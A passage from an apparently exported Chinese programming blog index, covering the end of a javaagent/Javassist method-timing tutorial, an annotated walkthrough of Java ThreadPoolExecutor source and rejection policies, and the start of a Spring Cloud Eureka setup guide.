class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">long</span> <span class=\"title function_\">getStartTime</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> startTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setStartTime</span><span class=\"params\">(<span class=\"type\">long</span> startTime)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.startTime = startTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">long</span> <span class=\"title function_\">getEndTime</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> endTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setEndTime</span><span class=\"params\">(<span class=\"type\">long</span> endTime)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.endTime = endTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getDepth</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> depth;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setDepth</span><span class=\"params\">(<span class=\"type\">int</span> depth)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.depth = depth;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改PreMain方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PreMain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String args, Instrumentation instrumentation)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;premain&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//新增</span></span><br><span class=\"line\">        instrumentation.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerDemo</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>项目打包后通过之前方法测试即可。</p>\n<h3 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h3><p>1、通过Tomcat启动时获取不到类的字节码<br>解决：因为Tomcat启动时使用多个类加载器作为系统类加载器。这时需要使用insertClassPath来解决</p>\n<p>2、部分方法无法修改<br>解决：过滤抽象方法</p>\n<h3 id=\"后续问题\"><a href=\"#后续问题\" class=\"headerlink\" title=\"后续问题\"></a>后续问题</h3><p>1、如果代码中使用循环，最好是能识别出来或者在后续打印过程中去掉<br>2、如果有死循环需要特别处理</p>\n<p>这个例子是在main方法启动前，还有get在main方法启动后agentmain。<br>不想在启动时加入VM参数可以参考lombok、stagemonitor的相关实现。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80MzQyNDI0Mjg0NmI=\">Javassist 使用指南（一）<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8tanNlNjEvaW5kZXguaHRtbA==\">Instrumentation 新功能<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otZHluMDMwMi9pbmRleC5odG1sP2NhPWRycy0=\">利用 Javassist 进行面向方面的更改<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8taW5zdHJ1bWVudGF0aW9uLw==\">Java 5 特性 Instrumentation 实践<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["javaagent"],"tags":["javaagent","调用栈","运行时间"]},{"title":"Java线程池","url":"/2018/01/15/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0/","content":"<p>一般使用Thread创建线程，如果频繁的创建销毁线程，系统资源比较浪费，线程启动调用的native方法，任务不能立即执行。<br>采用线程池可以通过重复利用已经创建的线程降低线程创建和销毁赵成的系统消耗，提高任务的响应速度，还可以对线程池中线程进行统一分配、调优和监控。</p>\n<h3 id=\"ThreadPoolExecutor\"><a href=\"#ThreadPoolExecutor\" class=\"headerlink\" title=\"ThreadPoolExecutor\"></a>ThreadPoolExecutor</h3><p>手动通过创建ThreadPoolExecutor创建线程池，其构造方法参数有：</p>\n<ul>\n<li>corePoolSize：池中所保存的线程数，包括空闲线程。（不能小于0）</li>\n<li>maximumPoolSize：池中允许的最大线程数。（不能小于等于0，不能小于corePoolSize）</li>\n<li>keepAliveTime：当线程数大于核心时，此为终止前多余的空闲线程等待新任务的最长时间。（不能小于0）</li>\n<li>unit：keepAliveTime 参数的时间单位</li>\n<li>workQueue：执行前用于保持任务的队列。此队列仅保持由 execute 方法提交的 Runnable 任务。（不能为null）</li>\n<li>threadFactory：执行程序创建新线程时使用的工厂。（不能为null）</li>\n<li>handler：由于超出线程范围和队列容量而使执行被阻塞时所使用的处理程序。（不能为null）</li>\n</ul>\n<p>threadFactory可以默认使用Executors.defaultThreadFactory()、handler可以默认使用ThreadPoolExecutor.defaultHandler（使用的是内部类ThreadPoolExecutor.AbortPolicy）。</p>\n<p>ThreadPoolExecutor有几个关键常量：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//默认为RUNNING(11100000000000000000000000000000)</span></span><br><span class=\"line\"><span class=\"comment\">//通过计算3高位表示线程运行状态，低29位位线程池中线程数量</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">AtomicInteger</span> <span class=\"variable\">ctl</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AtomicInteger</span>(ctlOf(RUNNING, <span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"comment\">//32 - 3 = 29</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">COUNT_BITS</span> <span class=\"operator\">=</span> Integer.SIZE - <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"comment\">//00011111111111111111111111111111（后续用于计算线程状态以及线程数量）</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">CAPACITY</span>   <span class=\"operator\">=</span> (<span class=\"number\">1</span> &lt;&lt; COUNT_BITS) - <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// runState is stored in the high-order bits</span></span><br><span class=\"line\"><span class=\"comment\">//运行状态存储在高阶</span></span><br><span class=\"line\"><span class=\"comment\">//11100000000000000000000000000000(32位)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">RUNNING</span>    <span class=\"operator\">=</span> -<span class=\"number\">1</span> &lt;&lt; COUNT_BITS;<span class=\"comment\">//接收新的任务并且也会处理已经提交等待的任务</span></span><br><span class=\"line\"><span class=\"comment\">//00000000000000000000000000000000 关闭状态</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">SHUTDOWN</span>   <span class=\"operator\">=</span>  <span class=\"number\">0</span> &lt;&lt; COUNT_BITS;<span class=\"comment\">//不会接收新的任务，但会处理已经提交等待的任务</span></span><br><span class=\"line\"><span class=\"comment\">//00100000000000000000000000000000 停止状态</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">STOP</span>       <span class=\"operator\">=</span>  <span class=\"number\">1</span> &lt;&lt; COUNT_BITS;<span class=\"comment\">//不接受新任务，不处理已经提交等待的任务，而且还会中断处理中的任务</span></span><br><span class=\"line\"><span class=\"comment\">//01000000000000000000000000000000 整理状态</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">TIDYING</span>    <span class=\"operator\">=</span>  <span class=\"number\">2</span> &lt;&lt; COUNT_BITS;<span class=\"comment\">//所有的任务被终止，workCount为0，为此状态时将会调用terminated()方法</span></span><br><span class=\"line\"><span class=\"comment\">//01100000000000000000000000000000 结束状态</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">TERMINATED</span> <span class=\"operator\">=</span>  <span class=\"number\">3</span> &lt;&lt; COUNT_BITS;<span class=\"comment\">//terminated()调用完成</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ctlOf</span><span class=\"params\">(<span class=\"type\">int</span> rs, <span class=\"type\">int</span> wc)</span> &#123; <span class=\"keyword\">return</span> rs | wc; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>提交任务使用execute：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">(Runnable command)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (command == <span class=\"literal\">null</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>();</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Proceed in 3 steps:</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * 1. If fewer than corePoolSize threads are running, try to</span></span><br><span class=\"line\"><span class=\"comment\">     * start a new thread with the given command as its first</span></span><br><span class=\"line\"><span class=\"comment\">     * task.  The call to addWorker atomically checks runState and</span></span><br><span class=\"line\"><span class=\"comment\">     * workerCount, and so prevents false alarms that would add</span></span><br><span class=\"line\"><span class=\"comment\">     * threads when it shouldn&#x27;t, by returning false.</span></span><br><span class=\"line\"><span class=\"comment\">     * 1. 如果运行的线程数corePoolSize，尝试开始一个新的线程，</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * 2. If a task can be successfully queued, then we still need</span></span><br><span class=\"line\"><span class=\"comment\">     * to double-check whether we should have added a thread</span></span><br><span class=\"line\"><span class=\"comment\">     * (because existing ones died since last checking) or that</span></span><br><span class=\"line\"><span class=\"comment\">     * the pool shut down since entry into this method. So we</span></span><br><span class=\"line\"><span class=\"comment\">     * recheck state and if necessary roll back the enqueuing if</span></span><br><span class=\"line\"><span class=\"comment\">     * stopped, or start a new thread if there are none.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * 3. If we cannot queue task, then we try to add a new</span></span><br><span class=\"line\"><span class=\"comment\">     * thread.  If it fails, we know we are shut down or saturated</span></span><br><span class=\"line\"><span class=\"comment\">     * and so reject the task.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">     <span class=\"comment\">//获取线程池存储的值</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> ctl.get();</span><br><span class=\"line\">    <span class=\"comment\">//比较线程池中运行的线程数量与corePoolSize的值</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果少于corePoolSize，新增worker，成功直接返回，如果新增启动成功，直接返回</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (addWorker(command, <span class=\"literal\">true</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"comment\">//如果新增失败获取最新的ctl值</span></span><br><span class=\"line\">        c = ctl.get();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果当前线程状态为运行状态，把当前任务放入队列中</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取最新状态</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">recheck</span> <span class=\"operator\">=</span> ctl.get();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class=\"line\">            <span class=\"comment\">//如果当前线程池不是运行状态，删除任务成功</span></span><br><span class=\"line\">            <span class=\"comment\">//拒绝任务、删除队列中的任务</span></span><br><span class=\"line\">            reject(command);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (workerCountOf(recheck) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//如果线程池中工作线程数量为0</span></span><br><span class=\"line\">            <span class=\"comment\">//添加null，不占用corePoolSize，添加null的目的是为了启动一个新的worker线程用来可以消费队列中的任务</span></span><br><span class=\"line\">            addWorker(<span class=\"literal\">null</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//如果队列已经满了无法放入</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!addWorker(command, <span class=\"literal\">false</span>))</span><br><span class=\"line\">        <span class=\"comment\">//尝试新增worker通过maximumPoolSize验证是否超过上限，这个时候启动新线程，但是不能超过maximumPoolSize</span></span><br><span class=\"line\">        reject(command);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//core：true表示用corePoolSize作为范围，否则使用maximumPoolSize</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"title function_\">addWorker</span><span class=\"params\">(Runnable firstTask, <span class=\"type\">boolean</span> core)</span> &#123;</span><br><span class=\"line\">    retry:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取线程池存储的值</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> ctl.get();</span><br><span class=\"line\">        <span class=\"comment\">//通过位运行计算当前线程池运行状态默认为111</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">rs</span> <span class=\"operator\">=</span> runStateOf(c);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Check if queue empty only if necessary.</span></span><br><span class=\"line\">        <span class=\"comment\">// 在线程正常运行时二进制值为111，此时首位为1表示负数，所以rs小于等于SHUTDOWN（0）表示线程池此时为非RUNNING状态</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果状态不为SHUTDOWN或者firstTask不为空或者工作队列为空，直接返回false</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rs &gt;= SHUTDOWN &amp;&amp;</span><br><span class=\"line\">            ! (rs == SHUTDOWN &amp;&amp;</span><br><span class=\"line\">               firstTask == <span class=\"literal\">null</span> &amp;&amp;</span><br><span class=\"line\">               ! workQueue.isEmpty()))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"comment\">//新增线程工作数量For + CAS</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取当前线程工作数量</span></span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">wc</span> <span class=\"operator\">=</span> workerCountOf(c);</span><br><span class=\"line\">            <span class=\"comment\">//如果数量大于CAPACITY存储上限，或者运行数量是否超过设置最大值</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (wc &gt;= CAPACITY ||</span><br><span class=\"line\">                wc &gt;= (core ? corePoolSize : maximumPoolSize))</span><br><span class=\"line\">                <span class=\"comment\">//操作设置最大值直接返回</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"comment\">//CAS尝试修改工作数量，成功直接跳出最外层循环（AtomicInteger.compareAndSet）</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndIncrementWorkerCount(c))</span><br><span class=\"line\">                <span class=\"keyword\">break</span> retry;</span><br><span class=\"line\">            <span class=\"comment\">//重新获取值</span></span><br><span class=\"line\">            c = ctl.get();  <span class=\"comment\">// Re-read ctl</span></span><br><span class=\"line\">            <span class=\"comment\">//CAS修改失败后，如果当前线程池状态已经发生了变化，跳出循环重试</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (runStateOf(c) != rs)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span> retry;</span><br><span class=\"line\">            <span class=\"comment\">// else CAS failed due to workerCount change; retry inner loop</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//新增工作线程完毕后执行，（只是修改ctl的值）</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">workerStarted</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">workerAdded</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">Worker</span> <span class=\"variable\">w</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//Workder继承AQS，用于设置状态，通过线程池工厂创建线程</span></span><br><span class=\"line\">        w = <span class=\"keyword\">new</span> <span class=\"title class_\">Worker</span>(firstTask);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">Thread</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> w.thread;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">mainLock</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.mainLock;</span><br><span class=\"line\">            mainLock.lock();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Recheck while holding lock.</span></span><br><span class=\"line\">                <span class=\"comment\">// Back out on ThreadFactory failure or if</span></span><br><span class=\"line\">                <span class=\"comment\">// shut down before lock acquired.</span></span><br><span class=\"line\">                <span class=\"comment\">//获取当前状态</span></span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">rs</span> <span class=\"operator\">=</span> runStateOf(ctl.get());</span><br><span class=\"line\">                <span class=\"comment\">//当前状态小于0（运行状态）、或者当前状态为0且传入Runnable为null</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (rs &lt; SHUTDOWN ||</span><br><span class=\"line\">                    (rs == SHUTDOWN &amp;&amp; firstTask == <span class=\"literal\">null</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//重新检查线程是否在运行</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (t.isAlive()) <span class=\"comment\">// precheck that t is startable</span></span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalThreadStateException</span>();</span><br><span class=\"line\">                    workers.add(w);</span><br><span class=\"line\">                    <span class=\"type\">int</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> workers.size();</span><br><span class=\"line\">                    <span class=\"comment\">//如果worker中数量大于largestPoolSize（默认0），设置largestPoolSize为worker中数量</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (s &gt; largestPoolSize)</span><br><span class=\"line\">                        largestPoolSize = s;</span><br><span class=\"line\">                    workerAdded = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//释放锁</span></span><br><span class=\"line\">                mainLock.unlock();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//如果添加成功，启动线程</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (workerAdded) &#123;</span><br><span class=\"line\">                t.start();</span><br><span class=\"line\">                workerStarted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果线程启动失败</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (! workerStarted)</span><br><span class=\"line\">            <span class=\"comment\">//处理添加失败的值，比如修改ctl中原本新增的值，从workers中删除之前添加的worker</span></span><br><span class=\"line\">            addWorkerFailed(w);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> workerStarted;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>execute其实就是修改ctl值，通过设置的值处理应该新启动线程还是放入队列中。</p>\n<p>在创建Worker后，线程工厂创建线程启动调用Worker.run，之后调用的是runWorker方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title function_\">runWorker</span><span class=\"params\">(Worker w)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"type\">Thread</span> <span class=\"variable\">wt</span> <span class=\"operator\">=</span> Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取线程任务</span></span><br><span class=\"line\">    <span class=\"type\">Runnable</span> <span class=\"variable\">task</span> <span class=\"operator\">=</span> w.firstTask;</span><br><span class=\"line\">    w.firstTask = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"comment\">//设置Worker状态为1</span></span><br><span class=\"line\">    w.unlock(); <span class=\"comment\">// allow interrupts</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">completedAbruptly</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果task为null直接从队列中获取task，这里就是之前addWorker(null, false)用处，启动一个线程从队列中获取任务</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (task != <span class=\"literal\">null</span> || (task = getTask()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            w.lock();</span><br><span class=\"line\">            <span class=\"comment\">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class=\"line\">            <span class=\"comment\">// if not, ensure thread is not interrupted.  This</span></span><br><span class=\"line\">            <span class=\"comment\">// requires a recheck in second case to deal with</span></span><br><span class=\"line\">            <span class=\"comment\">// shutdownNow race while clearing interrupt</span></span><br><span class=\"line\">            <span class=\"comment\">//中断处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class=\"line\">                 (Thread.interrupted() &amp;&amp;</span><br><span class=\"line\">                  runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class=\"line\">                !wt.isInterrupted())</span><br><span class=\"line\">                wt.interrupt();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//子类实现，当前类为空代码块</span></span><br><span class=\"line\">                beforeExecute(wt, task);</span><br><span class=\"line\">                <span class=\"type\">Throwable</span> <span class=\"variable\">thrown</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//运行任务</span></span><br><span class=\"line\">                    task.run();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (RuntimeException x) &#123;</span><br><span class=\"line\">                    thrown = x; <span class=\"keyword\">throw</span> x;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Error x) &#123;</span><br><span class=\"line\">                    thrown = x; <span class=\"keyword\">throw</span> x;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Throwable x) &#123;</span><br><span class=\"line\">                    thrown = x; <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(x);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//子类实现，当前类为空代码块</span></span><br><span class=\"line\">                    afterExecute(task, thrown);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                task = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                w.completedTasks++;</span><br><span class=\"line\">                w.unlock();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        completedAbruptly = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//处理任务退出</span></span><br><span class=\"line\">        processWorkerExit(w, completedAbruptly);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结线程池新增任务：<br>在线程池中新增任务时：当前工作线程数量小于corePoolSize，启动新线程；如果当前线程数量大于corePoolSize，把线程放入任务队列中，放入成功后，验证当前工作线程数是否为0，如果为0启动一个新线程处理任务；如果线程放入队列中失败，表示任务放入速度大于任务完成速度，这个时候启动新线程，但是总数不能大于maximumPoolSize。</p>\n<p>对于submit，其实就是把Callback封装成FutureTask，然后调用execute，返回封装的FutureTask</p>\n<h3 id=\"线程池队列\"><a href=\"#线程池队列\" class=\"headerlink\" title=\"线程池队列\"></a>线程池队列</h3><p>ArrayBlockingQueue：数组阻塞队列，需要指定大小<br>LinkedBlockingQueue：链表队列，默认为Integer.MAX_VALUE<br>PriorityBlockingQueue：优先级阻塞队列<br>SynchronousQueue：同步阻塞队列</p>\n<h3 id=\"线程池拒绝策略RejectedExecutionHandler\"><a href=\"#线程池拒绝策略RejectedExecutionHandler\" class=\"headerlink\" title=\"线程池拒绝策略RejectedExecutionHandler\"></a>线程池拒绝策略RejectedExecutionHandler</h3><p>AbortPolicy（默认）：直接抛出异常<br>CallerRunsPolicy：通过调用者所在线程执行任务，其实就是传递过来的Runnable.run，直接调用run方法<br>DiscardOldestPolicy：它放弃最旧的未处理请求（下一个任务），然后重试 execute；如果执行程序已关闭，则会丢弃该任务。也就是直接获取线程池中下一个任务然后不处理，重新执行execute<br>DiscardPolicy：不处理，丢弃当前未处理任务</p>\n<p>在使用工具类Executors，基本上也是直接使用线程池，需要注意使用的队列。</p>\n<p>在使用线程池的时候需要注意如果在线程中放入了数据也就是使用了ThreadLocal，因为线程在执行完任务后并不会销毁，可能其他任务获取到了当前线程设置的值，建议在使用完毕后删除ThreadLocal中的数据。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGlhb3h1Zm94L2FydGljbGUvZGV0YWlscy81MjI3ODUwOA==\">http://blog.csdn.net/xiaoxufox/article/details/52278508<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Ntc2Jsb2dzLmNvbS8=\">http://cmsblogs.com<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["多线程学习"],"tags":["线程池"]},{"title":"Spring Cloud 初步使用","url":"/2018/01/18/Spring%20Cloud%20%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/","content":"<h3 id=\"Eureka-Server-（服务中心）\"><a href=\"#Eureka-Server-（服务中心）\" class=\"headerlink\" title=\"Eureka Server （服务中心）\"></a>Eureka Server （服务中心）</h3><p>Eureka是一个服务注册和发现模块，基于 REST 的服务，用于定位服务，以实现云端中间层服务发现和故障转移。</p>\n<span id=\"more\"></span>\n<p>新建maven项目，pom文件如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- eureka-server/pom.xml --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span 